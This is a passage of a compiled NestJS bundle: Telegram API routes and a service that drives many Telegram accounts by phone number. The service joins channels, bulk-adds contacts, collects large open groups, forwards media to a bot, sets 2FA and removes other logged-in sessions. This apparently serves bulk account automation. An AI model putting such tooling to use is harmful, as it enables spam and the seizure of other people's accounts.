    (0, common_1.Post)('group/unblock/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Unblock a user in a group' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Object]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "unblockGroupUser", null);
__decorate([
    (0, common_1.Get)('group/admins/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get list of group admins' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'groupId', description: 'Group ID', required: true }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)('groupId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getGroupAdmins", null);
__decorate([
    (0, common_1.Get)('group/banned/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get list of banned users in a group' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'groupId', description: 'Group ID', required: true }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)('groupId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getGroupBannedUsers", null);
__decorate([
    (0, common_1.Post)('contacts/export/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Export contacts in vCard or CSV format' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiBody)({ type: dto_1.ContactExportImportDto }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __param(2, (0, common_1.Res)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, dto_1.ContactExportImportDto, Object]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "exportContacts", null);
__decorate([
    (0, common_1.Post)('contacts/import/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Import contacts from a list' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Array]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "importContacts", null);
__decorate([
    (0, common_1.Post)('contacts/block/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Manage blocked contacts' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiBody)({ type: dto_1.ContactBlockListDto }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, dto_1.ContactBlockListDto]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "manageBlockList", null);
__decorate([
    (0, common_1.Get)('contacts/statistics/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get contact activity statistics' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'Contact statistics retrieved successfully' }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getContactStatistics", null);
__decorate([
    (0, common_1.Post)('folders/create/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Create a new chat folder' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiBody)({ type: create_chat_folder_dto_1.CreateChatFolderDto }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, create_chat_folder_dto_1.CreateChatFolderDto]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "createChatFolder", null);
__decorate([
    (0, common_1.Get)('folders/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get all chat folders' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getChatFolders", null);
__decorate([
    (0, common_1.Put)('messages/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Edit message' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Object]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "editMessage", null);
__decorate([
    (0, common_1.Post)('chat/settings/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Update chat settings' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Object]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "updateChatSettings", null);
__decorate([
    (0, common_1.Post)('media/batch/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Send multiple media files in batch' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Object]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "sendMediaBatch", null);
__decorate([
    (0, common_1.Get)('security/2fa-status/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Check if 2FA password is set' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "hasPassword", null);
__decorate([
    (0, common_1.Get)('chats/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get chats with advanced filtering' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)('limit')),
    __param(2, (0, common_1.Query)('offsetDate')),
    __param(3, (0, common_1.Query)('offsetId')),
    __param(4, (0, common_1.Query)('offsetPeer')),
    __param(5, (0, common_1.Query)('folderId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Number, Number, Number, String, Number]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getChats", null);
__decorate([
    (0, common_1.Get)('file/url/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get downloadable URL for a file' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)('url')),
    __param(2, (0, common_1.Query)('filename')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String, String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getFileUrl", null);
__decorate([
    (0, common_1.Get)('messages/stats/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get message statistics' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Object]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getMessageStats", null);
__decorate([
    (0, common_1.Get)('chats/top-private/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get top 5 private chats with detailed statistics' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getTopPrivateChats", null);
__decorate([
    (0, common_1.Post)('bots/add-to-channel/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Add bots to channel with admin privileges' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiBody)({
        schema: {
            type: 'object',
            properties: {
                channelIds: {
                    type: 'array',
                    items: {
                        type: 'string'
                    },
                    description: 'Array of channel IDs to add bots to. If not provided, will use default channels from environment variables.'
                }
            }
        }
    }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'Bots added to channels successfully' }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Object]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "addBotsToChannel", null);
__decorate([
    (0, common_1.Post)('bot/create/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Create a new bot using BotFather' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiBody)({ type: dto_1.CreateBotDto }),
    (0, swagger_1.ApiResponse)({
        status: 201,
        description: 'Bot created successfully',
        schema: {
            type: 'object',
            properties: {
                botToken: { type: 'string', description: 'The token to access HTTP Bot API' },
                username: { type: 'string', description: 'The username of the created bot' }
            }
        }
    }),
    (0, swagger_1.ApiResponse)({ status: 400, description: 'Bad Request - Invalid bot details' }),
    (0, swagger_1.ApiResponse)({ status: 401, description: 'Unauthorized - Client not connected' }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, dto_1.CreateBotDto]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "createBot", null);
exports.TelegramController = TelegramController = __decorate([
    (0, common_1.Controller)('telegram'),
    (0, swagger_1.ApiTags)('Telegram'),
    __metadata("design:paramtypes", [Telegram_service_1.TelegramService])
], TelegramController);


/***/ }),

/***/ "./src/components/Telegram/Telegram.module.ts":
/*!****************************************************!*\
  !*** ./src/components/Telegram/Telegram.module.ts ***!
  \****************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.TelegramModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const Telegram_controller_1 = __webpack_require__(/*! ./Telegram.controller */ "./src/components/Telegram/Telegram.controller.ts");
const Telegram_service_1 = __webpack_require__(/*! ./Telegram.service */ "./src/components/Telegram/Telegram.service.ts");
const users_module_1 = __webpack_require__(/*! ../users/users.module */ "./src/components/users/users.module.ts");
const buffer_client_module_1 = __webpack_require__(/*! ../buffer-clients/buffer-client.module */ "./src/components/buffer-clients/buffer-client.module.ts");
const active_channels_module_1 = __webpack_require__(/*! ../active-channels/active-channels.module */ "./src/components/active-channels/active-channels.module.ts");
const channels_module_1 = __webpack_require__(/*! ../channels/channels.module */ "./src/components/channels/channels.module.ts");
const telegram_logger_1 = __webpack_require__(/*! ./utils/telegram-logger */ "./src/components/Telegram/utils/telegram-logger.ts");
const telegram_validation_config_1 = __webpack_require__(/*! ./config/telegram-validation.config */ "./src/components/Telegram/config/telegram-validation.config.ts");
const ConfigurationInit_1 = __webpack_require__(/*! ../ConfigurationInit */ "./src/components/ConfigurationInit/index.ts");
let TelegramModule = class TelegramModule {
};
exports.TelegramModule = TelegramModule;
exports.TelegramModule = TelegramModule = __decorate([
    (0, common_1.Module)({
        imports: [
            ConfigurationInit_1.InitModule,
            (0, common_1.forwardRef)(() => users_module_1.UsersModule),
            buffer_client_module_1.BufferClientModule,
            (0, common_1.forwardRef)(() => active_channels_module_1.ActiveChannelsModule),
            (0, common_1.forwardRef)(() => channels_module_1.ChannelsModule)
        ],
        controllers: [Telegram_controller_1.TelegramController],
        providers: [
            Telegram_service_1.TelegramService,
            telegram_validation_config_1.TelegramValidationConfig,
            {
                provide: 'TELEGRAM_LOGGER',
                useValue: telegram_logger_1.TelegramLogger.getInstance()
            }
        ],
        exports: [Telegram_service_1.TelegramService]
    })
], TelegramModule);


/***/ }),

/***/ "./src/components/Telegram/Telegram.service.ts":
/*!*****************************************************!*\
  !*** ./src/components/Telegram/Telegram.service.ts ***!
  \*****************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __importStar = (this && this.__importStar) || (function () {
    var ownKeys = function(o) {
        ownKeys = Object.getOwnPropertyNames || function (o) {
            var ar = [];
            for (var k in o) if (Object.prototype.hasOwnProperty.call(o, k)) ar[ar.length] = k;
            return ar;
        };
        return ownKeys(o);
    };
    return function (mod) {
        if (mod && mod.__esModule) return mod;
        var result = {};
        if (mod != null) for (var k = ownKeys(mod), i = 0; i < k.length; i++) if (k[i] !== "default") __createBinding(result, mod, k[i]);
        __setModuleDefault(result, mod);
        return result;
    };
})();
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.TelegramService = void 0;
const users_service_1 = __webpack_require__(/*! ../users/users.service */ "./src/components/users/users.service.ts");
const TelegramManager_1 = __importDefault(__webpack_require__(/*! ./TelegramManager */ "./src/components/Telegram/TelegramManager.ts"));
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const cloudinary_1 = __webpack_require__(/*! ../../cloudinary */ "./src/cloudinary.ts");
const active_channels_service_1 = __webpack_require__(/*! ../active-channels/active-channels.service */ "./src/components/active-channels/active-channels.service.ts");
const path = __importStar(__webpack_require__(/*! path */ "path"));
const channels_service_1 = __webpack_require__(/*! ../channels/channels.service */ "./src/components/channels/channels.service.ts");
const parseError_1 = __webpack_require__(/*! ../../utils/parseError */ "./src/utils/parseError.ts");
const connection_manager_1 = __webpack_require__(/*! ./utils/connection-manager */ "./src/components/Telegram/utils/connection-manager.ts");
const telegram_logger_1 = __webpack_require__(/*! ./utils/telegram-logger */ "./src/components/Telegram/utils/telegram-logger.ts");
const fs = __importStar(__webpack_require__(/*! fs */ "fs"));
const Helpers_1 = __webpack_require__(/*! telegram/Helpers */ "telegram/Helpers");
const fetchWithTimeout_1 = __webpack_require__(/*! ../../utils/fetchWithTimeout */ "./src/utils/fetchWithTimeout.ts");
const utils_1 = __webpack_require__(/*! ../../utils */ "./src/utils/index.ts");
let TelegramService = class TelegramService {
    constructor(usersService, activeChannelsService, channelsService) {
        this.usersService = usersService;
        this.activeChannelsService = activeChannelsService;
        this.channelsService = channelsService;
        this.logger = telegram_logger_1.TelegramLogger.getInstance();
        this.cleanupInterval = connection_manager_1.connectionManager.startCleanupInterval();
        connection_manager_1.connectionManager.setUsersService(this.usersService);
    }
    async onModuleDestroy() {
        this.logger.info('system', 'Module destroy initiated');
        clearInterval(this.cleanupInterval);
    }
    getActiveClientSetup() {
        return TelegramManager_1.default.getActiveClientSetup();
    }
    setActiveClientSetup(data) {
        TelegramManager_1.default.setActiveClientSetup(data);
    }
    async getMessages(mobile, username, limit = 8) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return telegramClient.getMessages(username, limit);
    }
    async getMessagesNew(mobile, username, offset, limit) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return telegramClient.getMessagesNew(username, offset, limit);
    }
    async sendInlineMessage(mobile, chatId, message, url) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return telegramClient.sendInlineMessage(chatId, message, url);
    }
    async getChatId(mobile, username) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return await telegramClient.getchatId(username);
    }
    async getLastActiveTime(mobile) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return await telegramClient.getLastActiveTime();
    }
    async tryJoiningChannel(mobile, chatEntity) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        try {
            await telegramClient.joinChannel(chatEntity.username);
            this.logger.debug(telegramClient.phoneNumber, " - Joined channel Success - ", chatEntity.username);
            if (chatEntity.canSendMsgs) {
            }
            else {
                await this.channelsService.remove(chatEntity.channelId);
                await this.activeChannelsService.remove(chatEntity.channelId);
                this.logger.debug("Removed Channel- ", chatEntity.username);
            }
        }
        catch (error) {
            this.logger.debug(telegramClient.phoneNumber, " - Failed to join - ", chatEntity.username);
            this.removeChannels(error, chatEntity.channelId, chatEntity.username);
            throw error;
        }
    }
    ;
    async removeChannels(error, channelId, username) {
        if (error.errorMessage == "USERNAME_INVALID" || error.errorMessage == 'CHAT_INVALID' || error.errorMessage == 'USERS_TOO_MUCH' || error.toString().includes("No user has")) {
            try {
                if (channelId) {
                    await this.channelsService.remove(channelId);
                    await this.activeChannelsService.remove(channelId);
                    this.logger.debug("Removed Channel- ", channelId);
                }
                else {
                    const channelDetails = (await this.channelsService.search({ username: username }))[0];
                    await this.channelsService.remove(channelDetails.channelId);
                    await this.activeChannelsService.remove(channelDetails.channelId);
                    this.logger.debug("Removed Channel - ", channelDetails.channelId);
                }
            }
            catch (searchError) {
                this.logger.debug("Failed to search/remove channel: ", searchError);
            }
        }
        else if (error.errorMessage === "CHANNEL_PRIVATE") {
            await this.channelsService.update(channelId, { private: true });
            await this.activeChannelsService.update(channelId, { private: true });
        }
    }
    async getGrpMembers(mobile, entity) {
        try {
            const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
            return await telegramClient.getGrpMembers(entity);
        }
        catch (err) {
            this.logger.error(mobile, "Error fetching group members:", err);
        }
    }
    async addContact(mobile, data, prefix) {
        try {
            const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
            return await telegramClient.addContact(data, prefix);
        }
        catch (err) {
            this.logger.error(mobile, "Error fetching adding Contacts:", err);
        }
    }
    async addContacts(mobile, phoneNumbers, prefix) {
        try {
            const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
            return await telegramClient.addContacts(phoneNumbers, prefix);
        }
        catch (err) {
            this.logger.error(mobile, "Error fetching adding Contacts:", err);
        }
    }
    async getSelfMsgsInfo(mobile) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return await telegramClient.getSelfMSgsInfo();
    }
    async createGroup(mobile) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return await telegramClient.createGroup();
    }
    async forwardMedia(mobile, channel, fromChatId) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        telegramClient.forwardMedia(channel, fromChatId);
        setTimeout(async () => {
            try {
                await this.leaveChannel(mobile, "2302868706");
            }
            catch (error) {
                this.logger.debug("Error in forwardMedia: ", error);
            }
        }, 5 * 60000);
        return "Media forward initiated";
    }
    async forwardMediaToBot(mobile, fromChatId) {
        try {
            const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
            await telegramClient.forwardMediaToBot(fromChatId);
            const dialogs = await telegramClient.getDialogs({ limit: 500 });
            const channels = dialogs
                .filter(chat => chat.isChannel || chat.isGroup)
                .map(chat => {
                const chatEntity = chat.entity;
                const cannotSendMsgs = chatEntity.defaultBannedRights?.sendMessages;
                if (!chatEntity.broadcast &&
                    !cannotSendMsgs &&
                    chatEntity.participantsCount > 50 &&
                    (0, utils_1.shouldMatch)(chatEntity)) {
                    return {
                        channelId: chatEntity.id.toString(),
                        canSendMsgs: true,
                        participantsCount: chatEntity.participantsCount,
                        private: false,
                        title: chatEntity.title,
                        broadcast: chatEntity.broadcast,
                        megagroup: chatEntity.megagroup,
                        restricted: chatEntity.restricted,
                        sendMessages: true,
                        username: chatEntity.username,
                        forbidden: false
                    };
                }
                return null;
            })
                .filter((channel) => Boolean(channel));
            await connection_manager_1.connectionManager.unregisterClient(mobile);
            await this.channelsService.createMultiple(channels);
            await this.activeChannelsService.createMultiple(channels);
            return "Media forward initiated successfully";
        }
        catch (error) {
            this.logger.error(mobile, "Error forwarding media:", error);
            return `Media forward failed: ${error.message}`;
        }
    }
    async blockUser(mobile, chatId) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return await telegramClient.blockUser(chatId);
    }
    async joinChannel(mobile, channelId) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return await telegramClient.joinChannel(channelId);
    }
    async getCallLog(mobile) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return await telegramClient.getCallLog();
    }
    async getmedia(mobile) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return await telegramClient.getMediaMessages();
    }
    async getChannelInfo(mobile, sendIds = false) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return await telegramClient.channelInfo(sendIds);
    }
    async getMe(mobile) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return await telegramClient.getMe();
    }
    async getEntity(mobile, entity) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return await telegramClient.getEntity(entity);
    }
    async createNewSession(mobile) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return await telegramClient.createNewSession();
    }
    async set2Fa(mobile) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        try {
            await telegramClient.set2fa();
            return '2Fa set successfully';
        }
        catch (error) {
            const errorDetails = (0, parseError_1.parseError)(error);
            throw new common_1.HttpException(errorDetails.message, errorDetails.status);
        }
    }
    async updatePrivacyforDeletedAccount(mobile) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        await telegramClient.updatePrivacyforDeletedAccount();
    }
    async deleteProfilePhotos(mobile) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        await telegramClient.deleteProfilePhotos();
    }
    async setProfilePic(mobile, name) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        await telegramClient.deleteProfilePhotos();
        try {
            await cloudinary_1.CloudinaryService.getInstance(name);
            await (0, Helpers_1.sleep)(2000);
            const rootPath = process.cwd();
            this.logger.debug("checking path", rootPath);
            await telegramClient.updateProfilePic(path.join(rootPath, 'dp1.jpg'));
            await (0, Helpers_1.sleep)(3000);
            await telegramClient.updateProfilePic(path.join(rootPath, 'dp2.jpg'));
            await (0, Helpers_1.sleep)(3000);
            await telegramClient.updateProfilePic(path.join(rootPath, 'dp3.jpg'));
            await (0, Helpers_1.sleep)(1000);
            return 'Profile pic set successfully';
        }
        catch (error) {
            const errorDetails = (0, parseError_1.parseError)(error);
            throw new common_1.HttpException(errorDetails.message, errorDetails.status);
        }
        finally {
            await connection_manager_1.connectionManager.unregisterClient(mobile);
        }
    }
    async updatePrivacy(mobile) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        try {
            await telegramClient.updatePrivacy();
            return "Privacy updated successfully";
        }
        catch (error) {
            const errorDetails = (0, parseError_1.parseError)(error);
            throw new common_1.HttpException(errorDetails.message, errorDetails.status);
        }
    }
    async downloadProfilePic(mobile, index) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        try {
            return await telegramClient.downloadProfilePic(index);
        }
        catch (error) {
            const errorDetails = (0, parseError_1.parseError)(error, `Error Downloading Profile Picture:`);
            this.logger.error(mobile, errorDetails.message, error);
            throw new Error("Failed to update username");
        }
    }
    async updateUsername(mobile, username) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        try {
            return await telegramClient.updateUsername(username);
        }
        catch (error) {
            const errorDetails = (0, parseError_1.parseError)(error, `Error Updating Username:`);
            this.logger.error(mobile, errorDetails.message, error);
            throw new Error("Failed to update username");
        }
    }
    async getMediaMetadata(mobile, params) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        if (params) {
            return await telegramClient.getAllMediaMetaData(params);
        }
        else {
            return await telegramClient.getMediaMetadata(params);
        }
    }
    async downloadMediaFile(mobile, messageId, chatId, res) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return await telegramClient.downloadMediaFile(messageId, chatId, res);
    }
    async forwardMessage(mobile, toChatId, fromChatId, messageId) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return await telegramClient.forwardMessage(toChatId, fromChatId, messageId);
    }
    async leaveChannels(mobile) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        const channelinfo = await telegramClient.channelInfo(false);
        const leaveChannelIds = channelinfo.canSendFalseChats;
        telegramClient.leaveChannels(leaveChannelIds);
        return "Left channels initiated";
    }
    async leaveChannel(mobile, channel) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        telegramClient.leaveChannels([channel]);
        return "Left channel initiated";
    }
    async deleteChat(mobile, params) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return await telegramClient.deleteChat(params);
    }
    async updateNameandBio(mobile, firstName, about) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return await telegramClient.updateProfile(firstName, about);
    }
    async getDialogs(mobile, query) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        const { limit = 10, offsetId, archived = false } = query;
        const dialogs = await telegramClient.getDialogs({ limit, offsetId, archived });
        const chatData = [];
        for (const chat of dialogs) {
            const chatEntity = await chat.entity.toJSON();
            chatData.push(chatEntity);
        }
        return chatData;
    }
    async getConnectionStatus() {
        const status = {
            activeConnections: connection_manager_1.connectionManager.getActiveConnectionCount(),
            rateLimited: 0,
            totalOperations: 0
        };
        this.logger.info('system', 'Connection status retrieved', status);
        return status;
    }
    async forwardBulkMessages(mobile, fromChatId, toChatId, messageIds) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return await telegramClient.forwardMessages(fromChatId, toChatId, messageIds);
    }
    async getAuths(mobile) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        const auths = await telegramClient.getAuths();
        this.logger.info(mobile, 'Retrieved authorizations', {
            count: auths?.length || 0
        });
        return auths;
    }
    async removeOtherAuths(mobile) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        await telegramClient.removeOtherAuths();
        this.logger.info(mobile, 'Removed other authorizations');
        return "Removed other authorizations";
    }
    async processBatch(items, batchSize, processor, delayMs = 2000) {
        const errors = [];
        let processed = 0;
        for (let i = 0; i < items.length; i += batchSize) {
            const batch = items.slice(i, i + batchSize);
            try {
                await processor(batch);
                processed += batch.length;
                if (i + batchSize < items.length) {
                    await new Promise(resolve => setTimeout(resolve, delayMs));
                }
            }
            catch (error) {
                errors.push(error);
                this.logger.error('batch-process', 'Batch processing failed', error);
            }
        }
        return { processed, errors };
    }
    async createGroupWithOptions(mobile, options) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        const result = await telegramClient.createGroupOrChannel(options);
        let groupId;
        if ('chats' in result && Array.isArray(result.chats) && result.chats.length > 0) {
            const chat = result.chats[result.chats.length - 1];
            groupId = chat.id?.toString();
        }
        this.logger.info(mobile, 'Group created', { id: groupId });
        return result;
    }
    async updateGroupSettings(mobile, settings) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return await telegramClient.updateGroupSettings(settings);
    }
    async scheduleMessage(mobile, options) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return await telegramClient.scheduleMessageSend({
            chatId: options.chatId,
            message: options.message,
            scheduledTime: options.scheduledTime,
            replyTo: options.replyTo,
            silent: options.silent
        });
    }
    async getScheduledMessages(mobile, chatId) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return await telegramClient.getScheduledMessages(chatId);
    }
    async sendMediaAlbum(mobile, album) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
